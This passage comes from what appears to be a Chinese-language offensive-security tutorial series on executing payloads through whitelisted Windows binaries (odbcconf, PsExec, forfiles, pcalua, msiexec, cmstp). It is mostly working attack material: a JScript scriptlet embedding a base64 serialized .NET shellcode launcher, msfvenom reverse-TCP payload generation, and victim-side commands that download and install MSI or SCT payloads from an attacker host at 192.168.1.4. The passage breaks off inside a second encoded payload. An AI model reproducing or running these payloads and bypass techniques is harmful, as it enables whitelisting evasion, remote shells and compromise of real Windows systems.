class="line">&quot;bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh&quot;+  </span><br><span class="line">&quot;NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz&quot;+  </span><br><span class="line">&quot;ZW1ibHkGFwAAAARMb2FkCg8MAAAAABQAAAJNWpAAAwAAAAQAAAD&#x2F;&#x2F;wAAuAAAAAAAAABAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy&quot;+  </span><br><span class="line">&quot;YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAVC1CXAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAA4AACIQsBCwAADAAAAAYAAAAAAAAOKgAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAwCkA&quot;+  </span><br><span class="line">&quot;AEsAAAAAQAAA0AIAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAALnRleHQAAAAUCgAAACAAAAAMAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAA0AIAAABA&quot;+  </span><br><span class="line">&quot;AAAABAAAAA4AAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAASAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAPApAAAAAAAASAAAAAIABQBEIgAAfAcAAAMAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQgIoBAAACgAA&quot;+  </span><br><span class="line">&quot;KAIAAAYAACoAAAAAAAAA&#x2F;OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH&#x2F;rDxhfAIsIMHPDQHH&quot;+  </span><br><span class="line">&quot;4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx&#x2F;6zBzw0BxzjgdfYDffg7fSR15FiL&quot;+  </span><br><span class="line">&quot;WCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf&#x2F;gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej&#x2F;&quot;+  </span><br><span class="line">&quot;0LiQAQAAKcRUUGgpgGsA&#x2F;9VqCmjAqAEEaAIAADWJ5lBQUFBAUEBQaOoP3+D&#x2F;1ZdqEFZXaJmldGH&#x2F;&quot;+  </span><br><span class="line">&quot;1YXAdAr&#x2F;Tgh17OhnAAAAagBqBFZXaALZyF&#x2F;&#x2F;1YP4AH42izZqQGgAEAAAVmoAaFikU+X&#x2F;1ZNTagBW&quot;+  </span><br><span class="line">&quot;U1doAtnIX&#x2F;&#x2F;Vg&#x2F;gAfShYaABAAABqAFBoCy8PMP&#x2F;VV2h1bk1h&#x2F;9VeXv8MJA+FcP&#x2F;&#x2F;&#x2F;+mb&#x2F;&#x2F;&#x2F;&#x2F;AcMp&quot;+  </span><br><span class="line">&quot;xnXBw7vwtaJWagBT&#x2F;9UAAAATMAYAZQAAAAEAABEAIFUBAACNBgAAASXQAwAABCgGAAAKC  </span><br><span class="line">hYGjml+&quot;+&quot;AQAABH4CAAAEKAMAAAYLBhYHbigHAAAKBo5pKAgAAAoAfgkAAAoMFg1+CQAAChMEFhYHEQQWEgMo&quot;  </span><br><span class="line">&quot;BAAABgwIFSgFAAAGJisAKkogABAAAIABAAAEH0CAAgAABCpCU0pCAQABAAAAAAAMAAAAdjQuMC4z&quot;+  </span><br><span class="line">&quot;MDMxOQAAAAAFAGwAAABgAgAAI34AAMwCAABkAwAAI1N0cmluZ3MAAAAAMAYAAAgAAAAjVVMAOAYA&quot;+  </span><br><span class="line">&quot;ABAAAAAjR1VJRAAAAEgGAAA0AQAAI0Jsb2IAAAAAAAAAAgAAAVfVAjQJAgAAAPolMwAWAAABAAAA&quot;+  </span><br><span class="line">&quot;DwAAAAQAAAADAAAABgAAAAwAAAALAAAABAAAAAEAAAABAAAAAQAAAAEAAAADAAAAAQAAAAEAAAAB&quot;+  </span><br><span class="line">&quot;AAAAAQAAAAAACgABAAAAAAAGAEsARAAGAFsBPwEGAHcBPwEGAKYBhgEGAMYBhgEGAPcBRAAGAEEC&quot;+</span><br><span class="line">&quot;hgEGAFwCRAAGAJgChgEGAKcCRAAGAK0CRAAGANACRAAGAAID4wIGABQD4wIGAEcDNwMAAAAAAQAA&quot;+  </span><br><span class="line">&quot;AAAAAQABAAEAEAAhACkABQABAAEAAAAAAPwBAAAFAAMABwATAQAAZgIAACEABAAHABEAXQASABEA&quot;+  </span><br><span class="line">&quot;aAASABMBhAI+AFAgAAAAAIYYUgAKAAEAwCEAAAAAkQBYAA4AAQAAAAAAgACRIH8AFQABAAAAAACA&quot;+  </span><br><span class="line">&quot;AJEgjAAdAAUAAAAAAIAAkSCZACgACwAxIgAAAACRGDADDgANAAAAAQCtAAAAAgC5AAAAAwC+AAAA&quot;+  </span><br><span class="line">&quot;BADPAAAAAQDZAAAAAgDsAAAAAwD4AAAABAAHAQAABQANAQAABgAdAQAAAQAoAQAAAgAwAREAUgAu&quot;+  </span><br><span class="line">&quot;ACEAUgA0ACkAUgAKAAkAUgAKADkAUgAKAEkAwAJCAGEA1wJKAGkACgNPAGEADwNYAHEAUgBkAHkA&quot;+  </span><br><span class="line">&quot;UgAKACcAWwA5AC4AEwBpAC4AGwByAGMAKwA5AAgABgCRAAEAVQEAAAQAWwAnAwABBwB&#x2F;AAEAAAEJ&quot;+  </span><br><span class="line">&quot;AIwAAQAAAQsAmQABAGggAAADAASAAAAAAAAAAAAAAAAAAAAAAOQBAAAEAAAAAAAAAAAAAAABADsA&quot;+  </span><br><span class="line">&quot;AAAAAAQAAwAAAAA8TW9kdWxlPgB3bWlfY3NfZGxsX3BheWxvYWQuZGxsAFByb2dyYW0AU2hlbGxD&quot;+  </span><br><span class="line">&quot;b2RlTGF1bmNoZXIAbXNjb3JsaWIAU3lzdGVtAE9iamVjdAAuY3RvcgBNYWluAE1FTV9DT01NSVQA&quot;+  </span><br><span class="line">&quot;UEFHRV9FWEVDVVRFX1JFQURXUklURQBWaXJ0dWFsQWxsb2MAQ3JlYXRlVGhyZWFkAFdhaXRGb3JT&quot;+  </span><br><span class="line">&quot;aW5nbGVPYmplY3QAbHBTdGFydEFkZHIAc2l6ZQBmbEFsbG9jYXRpb25UeXBlAGZsUHJvdGVjdABs&quot;+  </span><br><span class="line">&quot;cFRocmVhZEF0dHJpYnV0ZXMAZHdTdGFja1NpemUAbHBTdGFydEFkZHJlc3MAcGFyYW0AZHdDcmVh&quot;+  </span><br><span class="line">&quot;dGlvbkZsYWdzAGxwVGhyZWFkSWQAaEhhbmRsZQBkd01pbGxpc2Vjb25kcwBTeXN0ZW0uU2VjdXJp&quot;+  </span><br><span class="line">&quot;dHkuUGVybWlzc2lvbnMAU2VjdXJpdHlQZXJtaXNzaW9uQXR0cmlidXRlAFNlY3VyaXR5QWN0aW9u&quot;+  </span><br><span class="line">&quot;AFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0&quot;+  </span><br><span class="line">&quot;dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQB3bWlfY3NfZGxsX3BheWxvYWQA&quot;+  </span><br><span class="line">&quot;Qnl0ZQA8UHJpdmF0ZUltcGxlbWVudGF0aW9uRGV0YWlscz57MEQxQTVERjAtRDZCNy00RUUzLUJB&quot;+  </span><br><span class="line">&quot;QzItOTY0MUUyREJCMDNFfQBDb21waWxlckdlbmVyYXRlZEF0dHJpYnV0ZQBWYWx1ZVR5cGUAX19T&quot;+  </span><br><span class="line">&quot;dGF0aWNBcnJheUluaXRUeXBlU2l6ZT0zNDEAJCRtZXRob2QweDYwMDAwMDItMQBSdW50aW1lSGVs&quot;+  </span><br><span class="line">&quot;cGVycwBBcnJheQBSdW50aW1lRmllbGRIYW5kbGUASW5pdGlhbGl6ZUFycmF5AEludFB0cgBvcF9F&quot;+  </span><br><span class="line">&quot;eHBsaWNpdABTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMATWFyc2hhbABDb3B5AFplcm8A&quot;+  </span><br><span class="line">&quot;RGxsSW1wb3J0QXR0cmlidXRlAGtlcm5lbDMyAC5jY3RvcgBTeXN0ZW0uU2VjdXJpdHkAVW52ZXJp&quot;+  </span><br><span class="line">&quot;ZmlhYmxlQ29kZUF0dHJpYnV0ZQAAAAAAAyAAAAAAAPBdGg231uNOusKWQeLbsD4ACLd6XFYZNOCJ&quot;+  </span><br><span class="line">&quot;AyAAAQMAAAECBgkHAAQJCQkJCQoABhgJCQkYCRAJBQACCRgJBSABARENBCABAQgEAQAAAAMGERAH&quot;+  </span><br><span class="line">&quot;AAIBEikRLQQAARgKCAAEAR0FCBgIAgYYCAcFHQUJGAkYBCABAQ4IAQAIAAAAAAAeAQABAFQCFldy&quot;+  </span><br><span class="line">&quot;YXBOb25FeGNlcHRpb25UaHJvd3MBgJ4uAYCEU3lzdGVtLlNlY3VyaXR5LlBlcm1pc3Npb25zLlNl&quot;+  </span><br><span class="line">&quot;Y3VyaXR5UGVybWlzc2lvbkF0dHJpYnV0ZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3Vs&quot;+  </span><br><span class="line">&quot;dHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5FQFUAhBTa2lwVmVy&quot;+  </span><br><span class="line">&quot;aWZpY2F0aW9uAQAAAOgpAAAAAAAAAAAAAP4pAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAADwKQAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAAEAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAAB0AgAAAAAAAAAAAAB0AjQAAABW&quot;+  </span><br><span class="line">&quot;AFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv&#x2F;gAAAQAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;PwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAA&quot;+  </span><br><span class="line">&quot;AAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAE1AEAAAEAUwB0AHIAaQBuAGcA&quot;+  </span><br><span class="line">&quot;RgBpAGwAZQBJAG4AZgBvAAAAsAEAAAEAMAAwADAAMAAwADQAYgAwAAAALAACAAEARgBpAGwAZQBE&quot;+  </span><br><span class="line">&quot;AGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAACAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4A&quot;+  </span><br><span class="line">&quot;AAAAADAALgAwAC4AMAAuADAAAABQABcAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAHcAbQBp&quot;+  </span><br><span class="line">&quot;AF8AYwBzAF8AZABsAGwAXwBwAGEAeQBsAG8AYQBkAC4AZABsAGwAAAAAACgAAgABAEwAZQBnAGEA&quot;+  </span><br><span class="line">&quot;bABDAG8AcAB5AHIAaQBnAGgAdAAAACAAAABYABcAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBu&quot;+  </span><br><span class="line">&quot;AGEAbQBlAAAAdwBtAGkAXwBjAHMAXwBkAGwAbABfAHAAYQB5AGwAbwBhAGQALgBkAGwAbAAAAAAA&quot;+  </span><br><span class="line">&quot;NAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4AMAAAADgACAAB&quot;+  </span><br><span class="line">&quot;AEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAwAC4AMAAuADAALgAwAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAABA6AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAENAAAABAAAAAkXAAAACQYAAAAJFgAAAAYaAAAAJ1N5c3RlbS5SZWZs&quot;+  </span><br><span class="line">&quot;ZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQgAAAAKCwAA&quot;;</span><br><span class="line"> </span><br><span class="line">var entry_class &#x3D; &#39;ShellCodeLauncher.Program&#39;;  </span><br><span class="line"> </span><br><span class="line">try &#123;  </span><br><span class="line">setversion();  </span><br><span class="line">var stm &#x3D; base64ToStream(serialized_obj);  </span><br><span class="line">var fmt &#x3D; new ActiveXObject(&#39;System.Runtime.Serialization.Formatters.Binary.BinaryFormatter&#39;);  </span><br><span class="line">var al &#x3D; new ActiveXObject(&#39;System.Collections.ArrayList&#39;);  </span><br><span class="line">var d &#x3D; fmt.Deserialize_2(stm);  </span><br><span class="line">al.Add(undefined);  </span><br><span class="line">var o &#x3D; d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);  </span><br><span class="line">&#125; catch (e) &#123;  </span><br><span class="line">debug(e.message);  </span><br><span class="line">&#125;  </span><br><span class="line">]]&gt;</span><br><span class="line">&lt;&#x2F;script&gt;  </span><br><span class="line">&lt;&#x2F;component&gt;  </span><br><span class="line">&lt;&#x2F;package&gt;</span><br></pre></td></tr></table></figure>
<h2 id="82-基于白名单Odbcconf执行payload第十二季"><a href="#82-基于白名单Odbcconf执行payload第十二季" class="headerlink" title="82. 基于白名单Odbcconf执行payload第十二季"></a>82. 基于白名单Odbcconf执行payload第十二季</h2><ul>
<li>Windows 2003 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\system32\odbcconf.exe</span><br><span class="line">C:\WINDOWS\SysWOW64\odbcconf.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>Windows 7 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\odbcconf.exe</span><br><span class="line">C:\Windows\SysWOW64\odbcconf.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\SysWOW64\odbcconf.exe &#x2F;a &#123;regsvr C:\Micropoor_Odbcconf.dll&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://drive.google.com/open?id=1j12W7VOhv_-NdnZpFhWLwdt8sQwxdAsk">https://drive.google.com/open?id=1j12W7VOhv_-NdnZpFhWLwdt8sQwxdAsk</a></p>
<h2 id="83-基于白名单PsExec执行payload第十三季"><a href="#83-基于白名单PsExec执行payload第十三季" class="headerlink" title="83. 基于白名单PsExec执行payload第十三季"></a>83. 基于白名单PsExec执行payload第十三季</h2><ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PsExec.exe -d -s msiexec.exe &#x2F;q &#x2F;i &lt;http:&#x2F;&#x2F;192.168.1.4&#x2F;Micropoor_rev_x86_msi_53.txt&gt;</span><br></pre></td></tr></table></figure>
<h2 id="84-基于白名单Forfiles执行payload第十四季"><a href="#84-基于白名单Forfiles执行payload第十四季" class="headerlink" title="84. 基于白名单Forfiles执行payload第十四季"></a>84. 基于白名单Forfiles执行payload第十四季</h2><ul>
<li>Windows 2003 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\system32\forfiles.exe </span><br><span class="line">C:\WINDOWS\SysWOW64\forfiles.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>Windows 7 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\system32\forfiles.exe </span><br><span class="line">C:\WINDOWS\SysWOW64\forfiles.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">forfiles &#x2F;p c:\windows\system32 &#x2F;m cmd.exe &#x2F;c &quot;msiexec.exe &#x2F;q &#x2F;i http:&#x2F;&#x2F;192.168.1.4&#x2F;Micropoor_rev_x86_msi_53.txt&quot;</span><br></pre></td></tr></table></figure>
<h2 id="85-基于白名单Pcalua执行payload第十五季"><a href="#85-基于白名单Pcalua执行payload第十五季" class="headerlink" title="85. 基于白名单Pcalua执行payload第十五季"></a>85. 基于白名单Pcalua执行payload第十五季</h2><ul>
<li>Windows 7 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\pcalua.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Pcalua -m -a \\192.168.1.119\share\rev_x86_53_exe.exe</span><br></pre></td></tr></table></figure>
<h2 id="86-基于白名单Msiexec执行payload第八季补充"><a href="#86-基于白名单Msiexec执行payload第八季补充" class="headerlink" title="86. 基于白名单Msiexec执行payload第八季补充"></a>86. 基于白名单Msiexec执行payload第八季补充</h2><ul>
<li>基于白名单Msiexec.exe配置payload</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom ‐p windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp LHOST&#x3D;192.168.1.4 LPORT&#x3D;53 ‐ f dll &gt; Micropoor_rev_x64_53.dll</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msiexec &#x2F;y C:\Users\John\Desktop\Micropoor_rev_x64_dll.dll</span><br></pre></td></tr></table></figure>
<h2 id="87-基于白名单Cmstp-exe执行payload第十六季"><a href="#87-基于白名单Cmstp-exe执行payload第十六季" class="headerlink" title="87. 基于白名单Cmstp.exe执行payload第十六季"></a>87. 基于白名单Cmstp.exe执行payload第十六季</h2><ul>
<li>Windows 2003 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\cmstp.exe </span><br><span class="line">C:\Windows\SysWOW64\cmstp.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>Windows 7 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\cmstp.exe </span><br><span class="line">C:\Windows\SysWOW64\cmstp.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmstp.exe &#x2F;ni &#x2F;s C:\Users\John\Desktop\rev.inf</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>Micropoor_rev_cmstp_inf</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line">[version]</span><br><span class="line">Signature&#x3D;$chicago$ 4</span><br><span class="line"> </span><br><span class="line">AdvancedINF&#x3D;5</span><br><span class="line">[DefaultInstall_SingleUser]</span><br><span class="line">UnRegisterOCXs&#x3D;UnRegisterOCXSection</span><br><span class="line">[UnRegisterOCXSection]</span><br><span class="line">%11%\scrobj.dll,NI,http:&#x2F;&#x2F;192.168.1.4&#x2F;cmstp_rev_53_x64.sct</span><br><span class="line">[Strings]</span><br><span class="line">AppAct &#x3D; &quot;SOFTWARE\Microsoft\Connection Manager&quot;</span><br><span class="line">ServiceName&#x3D;&quot;Micropoor&quot;</span><br><span class="line">ShortSvcName&#x3D;&quot;Micropoor&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>cmstp_rev_53_x64.sct</strong> </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line">&lt;?XML version&#x3D;&quot;0&quot;?&gt;  </span><br><span class="line">&lt;scriptlet&gt;  </span><br><span class="line">&lt;registration  </span><br><span class="line">progid&#x3D;&quot;PoC&quot;  </span><br><span class="line">classid&#x3D;&quot;&#123;F0001111‐0000‐0000‐0000‐0000FEEDACDC&#125;&quot; &gt;  </span><br><span class="line">&lt;script language&#x3D;&quot;JScript&quot;&gt;  </span><br><span class="line">&lt;![CDATA[  </span><br><span class="line"> </span><br><span class="line">function setversion() &#123;  </span><br><span class="line">&#125;  </span><br><span class="line">function debug(s) &#123;&#125;  </span><br><span class="line">function base64ToStream(b) &#123;  </span><br><span class="line"> </span><br><span class="line">var enc &#x3D; new ActiveXObject(&quot;System.Text.ASCIIEncoding&quot;);  </span><br><span class="line">var length &#x3D; enc.GetByteCount_2(b);  </span><br><span class="line">var ba &#x3D; enc.GetBytes_4(b);  </span><br><span class="line">var transform &#x3D; new ActiveXObject(&quot;System.Security.Cryptography.FromBase64Transform&quot;);  </span><br><span class="line">ba &#x3D; transform.TransformFinalBlock(ba, 0, length);  </span><br><span class="line">var ms &#x3D; new ActiveXObject(&quot;System.IO.MemoryStream&quot;);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">ms.Write(ba, 0, (length &#x2F; 4) * 3);  </span><br><span class="line">ms.Position &#x3D; 0;  </span><br><span class="line">return ms;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  var serialized_obj &#x3D; &quot;AAEAAAD&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy&quot;+</span><br><span class="line"> &quot;AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph&quot;+</span><br><span class="line"> &quot;dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk&quot;+</span><br><span class="line"> &quot;ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD&quot;+</span><br><span class="line"> &quot;AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl&quot;+</span><br><span class="line"> &quot;RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU&quot;+</span><br><span class="line"> &quot;eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl&quot;+</span><br><span class="line"> &quot;cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90&quot;+</span><br><span class="line"> &quot;aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu&quot;+</span><br><span class="line"> &quot;MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH&quot;+</span><br><span class="line"> &quot;dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA&quot;+</span><br><span class="line"> &quot;ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw&quot;+</span><br><span class="line"> &quot;B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu&quot;+</span><br><span class="line"> &quot;dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA&quot;+</span><br><span class="line"> &quot;CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u&quot;+</span><br><span class="line"> &quot;SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5&quot;+</span><br><span class="line"> &quot;cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR&quot;+</span><br><span class="line"> 